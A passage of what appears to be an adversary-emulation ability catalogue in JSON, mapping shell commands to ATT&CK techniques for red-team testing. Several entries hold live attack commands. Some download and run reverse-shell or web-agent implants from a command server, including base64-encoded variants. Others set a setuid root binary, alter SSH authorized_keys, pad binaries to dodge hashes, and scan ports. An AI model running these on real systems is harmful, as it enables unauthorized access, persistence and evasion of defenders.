                "command": "msfconsole -r msf_extract.rb #{app.contact.http} #{app.api_key.red}",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 1000
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Load Metasploit Abilities",
        "tactic": "build-capabilities",
        "plugin": "access",
        "ability_id": "bed8f28e-c0ed-463e-9e31-d5607e5473df",
        "technique_id": "T1349",
        "repeatable": false
    },
    {
        "description": "Locate file that appears in the printer queue",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "find ~ -type f -name #{host.print.file} 2>/dev/null",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.system.path",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Locate file from printer queue",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "a41c2324-8c63-4b15-b3c5-84f920d1f226",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Hide a file on MacOS\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Files and Directories",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Mac Hidden file",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "a148e685a0a83fb45ee1c4a722905e7c",
        "technique_id": "T1564.001",
        "repeatable": false
    },
    {
        "description": "This test uses the IOKit API to load a kernel module for macOS.\nHarcoded to use SoftRAID kext\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MacOS - Load Kernel Module via KextManagerLoadKextWithURL()",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "b9dd5e8853b5e83299c439c34f9b77de",
        "technique_id": "T1547.006",
        "repeatable": false
    },
    {
        "description": "This test uses the kextload and kmutil commands to load and unload a MacOS kernel module.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MacOS - Load Kernel Module via kextload and kmutil",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "87c08b408756abf34e1fa3403d01fde7",
        "technique_id": "T1547.006",
        "repeatable": false
    },
    {
        "description": "Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Input Capture: Keylogging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "MacOS Swift Keylogger",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "92a964d6a72ac5162788d5a81cf1311a",
        "technique_id": "T1056.001",
        "repeatable": false
    },
    {
        "description": "Make, change owner, and change file attributes on a C source code file\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cp; sudo chown root /tmp/hello.c; sudo make /tmp/hello; sudo chown root /tmp/hello; sudo chmod u+s /tmp/hello; /tmp/hello",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "sudo rm /tmp/hello; sudo rm /tmp/hello.c"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Make and modify binary from C source",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "7ecae3350a573cf886e1a51e21b2cbbd",
        "technique_id": "T1548.001",
        "repeatable": false
    },
    {
        "description": "This test simulates an infected host beaconing to command and control.\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Application Layer Protocol: Web Protocols",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "curl -s -A \"HttpBrowser/1.0\" -m3 www.google.com; curl -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com; curl -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com; curl -s -A \"*<|>*\" -m3 www.google.com",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Malicious User Agents - Nix",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "810ebb2d039e78c1017dcb5efbd4a074",
        "technique_id": "T1071.001",
        "repeatable": false
    },
    {
        "description": "A reverse-shell agent which communicates via the TCP contact",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [
                    {
                        "description": "Run against the UDP contact",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMSI7Y29udGFjdD0idWRwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1odHRwICRzZXJ2ZXIgLXNvY2tldCAkc29ja2V0IC1jb250YWN0ICRjb250YWN0ICY="
                    },
                    {
                        "description": "Download with a random name and start as a background process",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMCI7Y29udGFjdD0idGNwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1odHRwICRzZXJ2ZXIgLXNvY2tldCAkc29ja2V0IC1jb250YWN0ICRjb250YWN0ICY="
                    }
                ],
                "payloads": [],
                "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:linux\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -http $server -socket $socket -contact $contact -v",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Manx",
        "tactic": "command-and-control",
        "plugin": "manx",
        "ability_id": "356d1722-7784-40c4-822b-0cf864b0b36d",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "SSH Authorized Keys",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "unset ssh_authorized_keys"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Modify SSH Authorized Keys",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "0c67915b076b2b044cedb3fe979f4c7e",
        "technique_id": "T1098.004",
        "repeatable": false
    },
    {
        "description": "Scan an external host for open ports and services",
        "buckets": [
            "technical-information-gathering"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Conduct active scanning",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "scanner.sh"
                ],
                "command": "./scanner.sh #{target.ip}",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 300
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "NMAP scan",
        "tactic": "technical-information-gathering",
        "plugin": "access",
        "ability_id": "567eaaba-94cc-4a27-83f8-768e5638f4e1",
        "technique_id": "T1254",
        "repeatable": false
    },
    {
        "description": "View network configuration info for host",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sudo ifconfig",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Network Interface Configuration",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "e8017c46-acb8-400c-a4b5-b3362b5b5baa",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Network Share Discovery\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Network Share Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "1c4b648dcee865a0233a5f15b0c5da8b",
        "technique_id": "T1135",
        "repeatable": false
    },
    {
        "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ls -a >> /tmp/T1083.txt; if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi; file */* *>> /tmp/T1083.txt; cat /tmp/T1083.txt 2>/dev/null; find . -type f; ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'; locate *; which sh",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/T1083.txt"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Nix File and Directory Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "7d07e97d0fb537914ab52056b230eb35",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Find or discover files on the file system\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name \".*\"",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/T1083.txt"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Nix File and Directory Discovery 2",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "feec1b093708c05e2f946a4e32253342",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "This test overwrites the contents of system log file with an empty string using echo utility\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Overwrite macOS system log via echo utility",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "7a0e720d1f695b05af9f1b9cfb83d481",
        "technique_id": "T1070.002",
        "repeatable": false
    },
    {
        "description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Sniffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Packet Capture macOS using /dev/bpfN with sudo",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "8694818da4f9da7580fdb477b6a3685a",
        "technique_id": "T1040",
        "repeatable": false
    },
    {
        "description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Sniffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Packet Capture macOS using tcpdump or tshark",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "79cc22aa5dd3e0e7dba90a3d0cfa1f0c",
        "technique_id": "T1040",
        "repeatable": false
    },
    {
        "description": "Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information: Binary Padding",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/evil-binary"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Pad Binary to Change Hash - Linux/macOS dd",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "1003589b9e99d9edbd22cdcd56394f53",
        "technique_id": "T1027.001",
        "repeatable": false
    },
    {
        "description": "Uses truncate to add a byte to the binary to change the hash.\n\nUpon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information: Binary Padding",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "truncate -s +1 /tmp/evil-binary",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/evil-binary"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Pad Binary to Change Hash using truncate command - Linux/macOS",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5c922d92f383656401d5633ca23db497",
        "technique_id": "T1027.001",
        "repeatable": false
    },
    {
        "description": "Search for valid SSH commands in the config file",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data from Local System",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "pip install -q stormssh 2> /dev/null && storm list | sed 's/\\x1b\\[[0-9;]*m//g'",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ssh",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "remote.ssh.cmd",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Parse SSH config",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "02de522f-7e0a-4544-8afc-0c195f400f5f",
        "technique_id": "T1005",
        "repeatable": false
    },
    {
        "description": "View the known_hosts file",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cat ~/.ssh/known_hosts",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Parse SSH known_hosts",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "5f77ecf9-613f-4863-8d2f-ed6b447a4633",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Password Policy Discovery",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Password Policy Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cat /etc/pam.d/common-password",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Password Policy",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "e82f39e2-56f8-4f19-8376-b007f9ac5f8a",
        "technique_id": "T1201",
        "repeatable": false
    },
    {
        "description": "Summary of permission and security groups",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Local Groups",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "groups",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Permission Groups Discovery",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2",
        "technique_id": "T1069.001",
        "repeatable": false
    },
    {
        "description": "Permission Groups Discovery\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Local Groups",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi; cat /etc/group",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Permission Groups Discovery (Local)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "ced42979f76b8fc19c1afffad66beed5",
        "technique_id": "T1069.001",
        "repeatable": false
    },
    {
        "description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Emond",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Persistance with Event Monitor - emond",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5043cd5dca66ce6b455b4aa793f0f0d5",
        "technique_id": "T1546.014",
        "repeatable": false
    },
    {
        "description": "Ping the network in order to build the ARP cache",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Ping network",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "ac9dce33-2acc-4b34-94ce-2596409ce8f0",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Port Scan",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "62b88a98e32cac28c744db4fcad3a0dd",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "Scan ports to check for listening ports with Nmap.\n\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of adresseses on port 80 to determine if listening. Results will be via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ -x \"$(command -v telnet)\" ]; then : ; else (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet); fi; if [ -x \"$(command -v nc)\" ]; then : ; else (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat); fi; if [ -x \"$(command -v nmap)\" ]; then : ; else (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap); fi;  ;  sudo nmap -sS 192.168.1.0/24 -p 80; telnet 192.168.1.1 80; nc -nv 192.168.1.1 80",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Port Scan Nmap",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "d84a4fab3739f1dca177364e5c4b02a4",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "See the most used WIFI networks of a machine",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "wifi.sh"
                ],
                "command": "./wifi.sh pref",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.wifipref",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "wifi.network.ssid",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Preferred WIFI",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "Print the current working directory on the system",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "pwd",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Print Working Directory",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "6e1a53c0-7352-4899-be35-fa7f364d5722",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ps >> /tmp/loot.txt; ps aux >> /tmp/loot.txt",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/loot.txt"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Process Discovery - ps",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "453b8d81c6118310308fb5b22de12235",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "Quit Outlook",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Service Stop",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Quit Outlook",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "3b007f46-23e7-4a11-9c14-e7085b6a754a",
        "technique_id": "T1489",
        "repeatable": false
    },
    {
        "description": "A Python agent which communicates via the HTML contact",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Application Layer Protocol: Web Protocols",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $server/file/download > ragdoll.py;\npip install requests beautifulsoup4;\npython ragdoll.py -W $server#{app.contact.html}",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "pkill -f ragdoll"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Ragdoll",
        "tactic": "command-and-control",
        "plugin": "stockpile",
        "ability_id": "0ab383be-b819-41bf-91b9-1bd4404d83bf",
        "technique_id": "T1071.001",
        "repeatable": false
    },
    {
        "description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Re-Opened Applications using LoginHook",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "412b488e4abdb153189de78b3a79af44",
        "technique_id": "T1547.007",
        "repeatable": false
    },
    {
        "description": "This test reads real-time system log file and writes empty string to it, thus clearing the log file without tampering with the logging process\n",
        "buckets": [
            "defense-evasion"
        ],
